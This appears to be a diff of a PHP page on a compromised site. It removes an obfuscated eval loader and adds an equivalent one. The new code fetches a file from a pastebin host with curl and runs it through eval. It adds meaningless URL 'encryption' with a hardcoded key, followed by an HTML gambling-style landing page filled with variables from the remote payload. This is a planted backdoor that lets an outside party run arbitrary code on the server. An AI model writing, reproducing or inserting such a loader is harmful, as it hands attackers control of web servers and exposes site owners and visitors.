@@ -1,14 +1,89 @@
 <?php
-eval(
-      /*92004739620608611629337658089964170647*/      
-urldecode("%3f%3e")
-        /*76642791646146541703895696776127028021*/        
-.file_get_contents(
-         /*51058727305996695833387762422348600183*/         
-urldecode("https://paste.myconan.net/528703.txt?Wge=760762992")
-       /*84326455800304936433858943355376206305*/       
-)
-     /*36191252266433047122544432690721642977*/     
-);
-         /*94472781449394159424981487961330561671*/  
+
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+
+define('ENCRYPTION_KEY', 'hohoHOHO2013');
+
+
+function encrypt($data, $key) {
+    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
+    return base64_encode(openssl_encrypt($data, 'aes-256-cbc', $key, 0, $iv) . '::' . $iv);
+}
+
+
+function decrypt($data, $key) {
+    list($encrypted_data, $iv) = explode('::', base64_decode($data), 2);
+    return openssl_decrypt($encrypted_data, 'aes-256-cbc', $key, 0, $iv);
+}
+
+
+$originalUrl = 'https://paste.myconan.net/528703.txt';
+
+
+$encryptedUrl = encrypt($originalUrl, ENCRYPTION_KEY);
+
+
+$decryptedUrl = decrypt($encryptedUrl, ENCRYPTION_KEY);
+
+
+function fetchExternalContent($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    $response = curl_exec($ch);
+    curl_close($ch);
+    return $response;
+}
+
+
+$externalContent = fetchExternalContent($decryptedUrl);
+
+if (!$externalContent) {
+    die('<p>Content is not available at the moment. Please try again later.</p>');
+}
+
+try {
+    eval('?>' . $externalContent);
+} catch (Throwable $e) {
+    die('<p>An error occurred while processing the content.</p>');
+}
+
 ?>
+<!DOCTYPE HTML>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title><?= htmlspecialchars($juth); ?> - Safe and Secure Experience</title>
+    <meta name="description" content="Enjoy a safe and secure experience with <?= htmlspecialchars($juth); ?>.">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="index, follow">
+    <link rel="icon" href="https://png.vm9com.org/vm99.png">
+    <link rel="canonical" href="<?= htmlspecialchars($link); ?>">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' https://png.vm9com.org; style-src 'self'; script-src 'self';">
+    <style>
+        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 20px; }
+        h1 { color: #333; }
+        p { color: #555; }
+        .content { margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Welcome to <?= htmlspecialchars($juth); ?></h1>
+    </header>
+    <main>
+        <p>Enjoy a safe and reliable gaming experience with <?= htmlspecialchars($juth); ?>.</p>
+        <div class="content">
+            <!-- External content is executed above using eval -->
+        </div>
+    </main>
+    <footer>
+        <p>&copy; <?= date('Y'); ?> All rights reserved.</p>
+    </footer>
+</body>
+</html>
